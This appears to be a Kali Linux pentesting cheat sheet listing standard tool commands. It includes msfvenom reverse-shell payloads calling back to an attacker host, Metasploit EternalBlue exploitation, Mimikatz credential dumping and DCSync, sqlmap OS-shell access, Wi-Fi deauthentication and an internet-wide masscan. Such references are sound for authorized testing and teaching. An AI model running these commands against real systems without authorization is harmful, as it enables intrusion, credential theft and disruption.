# Kali Linux Essential Tools Reference

> Core tools for penetration testing and red team operations.

---

## Information Gathering

### Nmap
```bash
# Basic scans
nmap target.com
nmap -sS target.com                    # SYN scan
nmap -sT target.com                    # TCP connect scan
nmap -sU target.com                    # UDP scan
nmap -sV target.com                    # Version detection
nmap -A target.com                     # Aggressive (OS, version, scripts, traceroute)
nmap -O target.com                     # OS detection
nmap -p- target.com                    # All ports
nmap --script=vuln target.com          # Vulnerability scan
nmap --script=ssl-heartbleed target.com
nmap --script=smb-vuln-ms17-010 target.com

# Output formats
nmap -oA output target.com             # All formats
nmap -oN output.txt target.com         # Normal
nmap -oX output.xml target.com         # XML
nmap -oG output.grep target.com        # Grepable
```

### Masscan
```bash
masscan 192.168.1.0/24 -p1-65535 --rate=1000
masscan 0.0.0.0/0 -p443 --rate=10000
```

### Recon-ng
```bash
recon-ng
> marketplace refresh
> marketplace search domains
> modules load recon/domains-hosts/brute_hosts
> options set SOURCE target.com
> run
```

### TheHarvester
```bash
theharvester -d target.com -b all
theharvester -d target.com -b google,linkedin,twitter
```

---

## Vulnerability Scanning

### OpenVAS/GVM
```bash
# Web interface at https://localhost:9392
gvm-start
gvm-check-setup
```

### Nikto
```bash
nikto -h https://target.com
nikto -h https://target.com -C all          # Check all CGI dirs
nikto -h https://target.com -Tuning x        # Scan type
```

### Nuclei
```bash
nuclei -u https://target.com
nuclei -u https://target.com -t cves/
nuclei -l urls.txt -t cves/ -o results.txt
```

---

## Web Application Testing

### Burp Suite
- Proxy: Intercept and modify requests
- Repeater: Manual request modification
- Intruder: Automated attacks
- Scanner: Automated vulnerability detection
- Sequencer: Session token analysis
- Decoder: Encoding/decoding

### OWASP ZAP
```bash
zaproxy
# Quick Start -> Automated Scan
```

### SQLMap
```bash
sqlmap -u "https://target.com/page.php?id=1" --batch
sqlmap -u "https://target.com/page.php?id=1" --dbs
sqlmap -u "https://target.com/page.php?id=1" -D dbname -T users --dump
sqlmap -u "https://target.com/page.php?id=1" --os-shell
```

### Gobuster
```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster vhost -u https://target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### ffuf
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u https://FUZZ.target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## Exploitation

### Metasploit
```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target.com
set LHOST 10.0.0.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### Searchsploit
```bash
searchsploit apache 2.4
searchsploit -m 42031           # Copy exploit to current directory
searchsploit -x 42031           # Examine exploit
searchsploit --nmap nmap.xml    # Search from Nmap results
```

### msfvenom
```bash
# Windows payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe

# Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o payload.elf

# macOS payload
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f macho -o payload.macho

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f aspx -o shell.aspx

# Encoded payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x64/xor -i 3 -f exe -o encoded.exe
```

---

## Post-Exploitation

### Mimikatz
```bash
# Credential dumping
sekurlsa::logonpasswords
sekurlsa::tickets /export
lsadump::sam
lsadump::secrets
lsadump::cache
kerberos::list
kerberos::ptt ticket.kirbi

# Golden ticket
kerberos::golden /user:administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:hash

# DCSync
lsadump::dcsync /domain:corp.com /user:administrator
```

### BloodHound
```bash
# Data collection
.
SharpHound.exe -c All
.
SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Analysis
bloodhound
# Upload zip file and analyze attack paths
```

### PowerSploit
```powershell
.
PowerUp.ps1
Invoke-AllChecks

.
PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Invoke-ShareFinder
Invoke-UserHunter
```

### Impacket
```bash
# Python scripts for Windows protocol abuse
psexec.py domain/admin@target.com
wmiexec.py domain/admin@target.com
smbexec.py domain/admin@target.com
atexec.py domain/admin@target.com
secretsdump.py domain/admin@target.com
GetADUsers.py domain/admin@target.com
GetNPUsers.py domain/admin@target.com
GetUserSPNs.py domain/admin@target.com
```

### CrackMapExec
```bash
crackmapexec smb 10.0.0.0/24 -u admin -p password
crackmapexec smb 10.0.0.0/24 -u admin -H NTLM_HASH
crackmapexec smb 10.0.0.0/24 -u '' -p '' --shares
crackmapexec winrm 10.0.0.0/24 -u admin -p password -x whoami
crackmapexec mssql 10.0.0.0/24 -u admin -p password -x "SELECT @@version"
crackmapexec ldap 10.0.0.0/24 -u admin -p password --bloodhound
```

---

## Wireless Testing

### Aircrack-ng
```bash
# Monitor mode
airmon-ng start wlan0

# Scan networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

## Reverse Engineering

### Ghidra
- Free NSA tool for reverse engineering
- Supports multiple architectures
- Decompilation capabilities

### radare2
```bash
r2 binary
aaa          # Analyze all
afl          # List functions
ii           # Imports
iS           # Sections
pdf @ main   # Disassemble main
V            # Visual mode
```

### GDB
```bash
gdb ./binary
break main
run
x/10x $esp
info registers
stepi
next
continue
```
